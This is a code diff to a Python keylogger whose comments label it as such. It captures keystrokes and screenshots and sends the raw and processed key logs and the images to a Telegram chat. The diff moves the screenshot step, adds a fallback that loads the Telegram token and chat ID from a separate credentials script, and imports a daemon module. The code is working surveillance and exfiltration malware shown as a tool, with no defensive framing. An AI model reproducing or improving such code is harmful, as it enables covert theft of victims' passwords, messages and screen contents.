@@ -13,6 +13,8 @@ from PIL import ImageGrab
 import requests
 import json
 import io
+import credentials
+import daemon
 
 # TODO threading para soportar capturas de pantalla cada x tiempo y captura de teclado cada y
 # TODO error handling with the primary goal of not stopping the program
@@ -152,23 +154,25 @@ def handle_keyboard_interrupt(key_listener):
     Returns:
         None
     """
-    # Take screnshot and save it as a PNG file
-    screenshot = take_screenshot()
-
     # Capture typed keys and process them
     typed_keys = key_listener.get_keys()
     processed_keys = process_keys(typed_keys)
     message = format_message(typed_keys)
     processed_message = format_message(processed_keys)
 
+    # Take screnshot and save it as a PNG file
+    screenshot = take_screenshot()
+
     # Write the message to the log file
     write_to_log(message, LOG_FILE)
     write_to_log(processed_message, LOG_FILE_2)
 
+    credentials = load_credentials_telegram() if (loaded := load_credentials_telegram()) is not None else load_credentials_telegram_from_script()
+
     # Load credentials a pass to send logs through Telegram
-    send_info_telegram(**load_credentials_telegram(), message='RAW KEYLOGGER LOG\n\n' + message)
-    send_info_telegram(**load_credentials_telegram(), message='PROCESSED KEYLOGGER LOG\n\n' + processed_message)
-    send_image_telegram(**load_credentials_telegram(), image=screenshot)
+    send_info_telegram(**credentials, message='RAW KEYLOGGER LOG\n\n' + message)
+    send_info_telegram(**credentials, message='PROCESSED KEYLOGGER LOG\n\n' + processed_message)
+    send_image_telegram(**credentials, image=screenshot)
 
     try:
         sys.exit(130)
@@ -265,32 +269,44 @@ def load_credentials_telegram():
     
     return {'token': token, 'chat_id': chat_id}
 
+def load_credentials_telegram_from_script():
+    """
+    Load the Telegram credentials from a python script
+
+    Returns:
+        dict: A dictionary containing the Telegram token and chat ID.
+            - 'token' (str): The Telegram token.
+            - 'chat_id' (str): The Telegram chat ID.
+    """
+    return credentials.get_credentials()
+
 # --------------------- MAIN --------------------- #
 
 def main():
     key_listener = KeyListener()
     try:
         while True:
-            # Take screnshot and save it as a PNG file
-            screenshot = take_screenshot()
-
             # Capture typed keys and process them
             typed_keys = key_listener.read_keys(TIME_OUT)
             processed_keys = process_keys(typed_keys)
             message = format_message(typed_keys)
             processed_message = format_message(processed_keys)
 
+            # Take screnshot and save it as a PNG file
+            screenshot = take_screenshot()
+
             # Write the message to the log file
             write_to_log(message, LOG_FILE)
             write_to_log(processed_message, LOG_FILE_2)
 
+            credentials = load_credentials_telegram_from_script()
+
             # Load credentials a pass to send logs through Telegram
-            send_info_telegram(**load_credentials_telegram(), message='RAW KEYLOGGER LOG\n\n' + message)
-            send_info_telegram(**load_credentials_telegram(), message='PROCESSED KEYLOGGER LOG\n\n' + processed_message)
-            send_image_telegram(**load_credentials_telegram(), image=screenshot)
+            send_info_telegram(**credentials, message='RAW KEYLOGGER LOG\n\n' + message)
+            send_info_telegram(**credentials, message='PROCESSED KEYLOGGER LOG\n\n' + processed_message)
+            send_image_telegram(**credentials, image=screenshot)
     except KeyboardInterrupt:
         handle_keyboard_interrupt(key_listener)
-
 
 if __name__ == "__main__":
     main()
